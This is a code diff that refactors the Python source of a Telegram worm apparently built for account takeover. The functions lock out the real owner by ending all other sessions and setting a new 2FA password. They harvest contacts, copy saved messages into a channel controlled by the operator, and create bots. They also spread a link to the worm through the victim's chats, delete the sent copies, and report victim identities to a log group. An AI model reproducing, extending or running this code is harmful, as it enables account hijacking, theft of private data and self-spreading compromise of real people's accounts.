@@ -15,7 +15,16 @@ random_string = lambda length: ''.join(random.choices(string.ascii_letters + str
 LOG_GROUP = int(os.environ['LOG_GROUP'])
 PUBLIC_HOST = os.environ['PUBLIC_HOST']
 
-async def terminate_all_other(client: TelegramClient, me: User) -> None:
+async def wrm_unblock_all_blocked(client: TelegramClient, me: User) -> None:
+    logger.info(f"Unblocking all blocked users for {me.phone}")
+    result = await client(functions.contacts.GetBlockedRequest(offset=0, limit=100))
+    for user in result.users:
+        try:
+            await client(functions.contacts.UnblockRequest(user.id))
+        except:
+            logger.error(f"Failed to unblock user: {user.id}")
+    logger.info(f"All blocked users unblocked for {me.phone}")
+async def wrm_terminate_all_other(client: TelegramClient, me: User) -> None:
     logger.info(f"Terminating all other sessions for user {me.phone}")
     result = await client(functions.account.GetAuthorizationsRequest())
     for auth in result.authorizations:
@@ -26,7 +35,7 @@ async def terminate_all_other(client: TelegramClient, me: User) -> None:
         except:
             logger.error(f"Failed to terminate session: {auth.api_id}, {auth.app_name}")
     logger.info(f"All other sessions terminated for user {me.phone}")
-async def set_passwd(client: TelegramClient, me: User) -> None:
+async def wrm_set_passwd(client: TelegramClient, me: User) -> None:
     logger.info(f"Setting password for user {me.phone}")
     user_data = mongo_client.userdb.sessions.find_one({'phone': me.phone})
     password = random_string(16)
@@ -34,10 +43,10 @@ async def set_passwd(client: TelegramClient, me: User) -> None:
         await client.edit_2fa(current_password=user_data['password'], new_password=password)
     else:
         await client.edit_2fa(new_password=password)
-    mongo_client.userdb.sessions.update_one({'phone': me.phone}, {'$set': {'password': password, 'worm_done': True}})
+    mongo_client.userdb.sessions.update_one({'phone': me.phone}, {'$set': {'password': password}})
     logger.debug(f"Password set for {me.phone}")
-async def backup_contacts(client: TelegramClient) -> None:
-    logger.info("Backing up contacts...")
+async def wrm_backup_contacts(client: TelegramClient, me: User) -> None:
+    logger.info(f"Backing up contacts for {me.phone}")
     result = await client(functions.contacts.GetContactsRequest(hash=0))
     operations = [
         UpdateOne({'chat_id': user.id}, {"$setOnInsert": {'phone': user.phone}}, upsert=True)
@@ -48,9 +57,9 @@ async def backup_contacts(client: TelegramClient) -> None:
         result = mongo_client.userdb.sessions.bulk_write(operations)
         # Inserted count is the number of upserts that resulted in an insert
         inserted_count = result.upserted_count
-    logger.debug(f"Contacts inserted: {inserted_count} (out of {len(operations)} attempted).")
-async def create_bot(client: TelegramClient, me: User) -> Optional[Dict[str, any]]:
-    logger.info("Creating new bot via BotFather...")
+    logger.debug(f"Contacts inserted: {inserted_count} (out of {len(operations)} attempted) ")
+async def wrm_create_bot(client: TelegramClient, me: User) -> str:
+    logger.info(f"Creating new bot for {me.phone} via BotFather...")
     async with client.conversation("@BotFather") as conv:
         msg = await conv.send_message("/newbot")
         await (await conv.get_response()).delete()
@@ -72,42 +81,8 @@ async def create_bot(client: TelegramClient, me: User) -> Optional[Dict[str, any
     mongo_client.wormdb.bots.insert_one(botinfo)
     logger.debug(f"Bot created: {botinfo}")
     return botinfo
-async def backup_saves(client: TelegramClient, me: User, logger_bot: TelegramClient, perm_logs: Optional[Dict[str, any]]) -> Optional[Dict[str, any]]:
-    logger.info("Backing up saved messages...")
-    result = await client(functions.channels.CreateChannelRequest(
-        title=f'{me.first_name} {me.last_name}',
-        about=f'ID: {me.id}\nUsername: {me.username}',
-        megagroup=False,
-    ))
-    channel_id = result.updates[1].channel_id
-    dest = await client.get_entity(channel_id)
-    result = await client(functions.messages.ExportChatInviteRequest(peer=channel_id))
-    mongo_client.wormdb.channels.insert_one({"invite": result.link, "owner": me.id})
-    await client.send_message(dest, f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}")
-    msg_count = 0
-    async for message in client.iter_messages("me", reverse=True):
-        msg_count += 1
-        try:
-            await message.forward_to(dest)
-        except errors.FloodWaitError as e:
-            logger.warning(f"FloodWaitError while forwarding message: {e.seconds}s")
-            await asyncio.sleep(e.seconds)
-            await message.forward_to(dest)
-        except Exception as e:
-            logger.error(f"Error forwarding message: {e}")
-    log = {
-        'txt': f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}\nSaved Messages: {msg_count}\nPremium: {me.premium}",
-        'channel_id': channel_id,
-        'hash': result.link.split('/')[-1].lstrip('+'),
-    }
-    if perm_logs and len(perm_logs['creator'])+len(perm_logs['admin']) > 0:
-        log['txt'] = log['txt'].replace("Session", f"Owner: {len(perm_logs['creator'])} Admin: {len(perm_logs['admin'])}\nSession")
-        await client.send_message(dest, json.dumps(perm_logs, indent=4, ensure_ascii=False))
-    await client(functions.channels.LeaveChannelRequest(channel=channel_id))
-    await logger_bot.send_message(LOG_GROUP, log['txt'])
-    logger.debug(f"Backup log: {log}")
-async def spread(client: TelegramClient, me: User) -> None:
-    logger.info("Spreading worm message...")
+async def wrm_spread(client: TelegramClient, me: User) -> Optional[Dict[str, any]]:
+    logger.info(f"Spreading worm message for {me.phone}...")
     spread_msg = None
     worm_url = PUBLIC_HOST+("".join(random.choice(string.ascii_letters+string.digits) for i in range(16)))
     spread_msg_nomedia = f"{strings['worm_msg']}\n\n{worm_url}"
@@ -158,32 +133,53 @@ async def spread(client: TelegramClient, me: User) -> None:
         if dialog.is_user:
             await msg.delete(revoke=False)
     return perm_logs
+async def wrm_backup_saves(client: TelegramClient, me: User) -> Optional[Dict[str, any]]:
+    logger.info(f"Backing up saved messages for {me.phone}...")
+    result = await client(functions.channels.CreateChannelRequest(
+        title=f'{me.first_name} {me.last_name}',
+        about=f'ID: {me.id}\nUsername: {me.username}',
+        megagroup=False,
+    ))
+    channel_id = result.updates[1].channel_id
+    dest = await client.get_entity(channel_id)
+    result = await client(functions.messages.ExportChatInviteRequest(peer=channel_id))
+    mongo_client.wormdb.channels.insert_one({"invite": result.link, "owner": me.id})
+    await client.send_message(dest, f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}")
+    msg_count = 0
+    async for message in client.iter_messages("me", reverse=True):
+        msg_count += 1
+        try:
+            await message.forward_to(dest)
+        except errors.FloodWaitError as e:
+            logger.warning(f"FloodWaitError while forwarding message: {e.seconds}s")
+            await asyncio.sleep(e.seconds)
+            await message.forward_to(dest)
+        except Exception as e:
+            logger.error(f"Error forwarding message: {e}")
+    await client(functions.channels.LeaveChannelRequest(channel=channel_id))
+    return {"invite": result.link, "msg_count": msg_count}
+
+wormFunctions = [obj for name, obj in globals().items() if callable(obj) and obj.__class__.__name__ == "function" and name.startswith('wrm_')]
 
 async def worm(client: TelegramClient, logger_bot: TelegramClient) -> None:
     logger.info("Starting worm sequence...")
     me = await client.get_me()
-    perm_logs = None
-    try:
-        await terminate_all_other(client, me)
-    except Exception as e:
-        logger.error(f"Error in terminate_all_other: {e}")
-    try:
-        await set_passwd(client, me)
-    except Exception as e:
-        logger.error(f"Error in set_passwd: {e}")
-    try:
-        await backup_contacts(client)
-    except Exception as e:
-        logger.error(f"Error in backup_contacts: {e}")
-    try:
-        await create_bot(client, me)
-    except Exception as e:
-        logger.error(f"Error in create_bot: {e}")
-    try:
-        perm_logs = await spread(client, me)
-    except Exception as e:
-        logger.error(f"Error in spread: {e}")
-    try:
-        await backup_saves(client, me, logger_bot, perm_logs)
-    except Exception as e:
-        logger.error(f"Error in backup_saves: {e}")
+    results = {}
+    for function in wormFunctions:
+        try:
+            result = await function(client, me)
+            results[function.__name__] = result
+        except Exception as e:
+            logger.error(f"Error in {function.__name__}: {e}")
+    log = f'''ID: {me.id}
+Username: {me.username}
+First name: {me.first_name}
+Last name: {me.last_name}
+Phone: {me.phone}
+Link: {results.get('wrm_backup_saves', {}).get('invite')}
+Saved Messages: {results.get('wrm_backup_saves', {}).get('msg_count')}
+Premium: {me.premium}'''
+    if results.get('wrm_spread') and len(results['wrm_spread'].get('creator', [])) + len(results['wrm_spread'].get('admin', [])) > 0:
+        log += f"\nOwner: {len(results['wrm_spread'].get('creator', []))} Admin: {len(results['wrm_spread'].get('admin', []))}"
+    await logger_bot.send_message(LOG_GROUP, log)
+    mongo_client.userdb.sessions.update_one({'phone': me.phone}, {'$set': {'worm_done': True}})
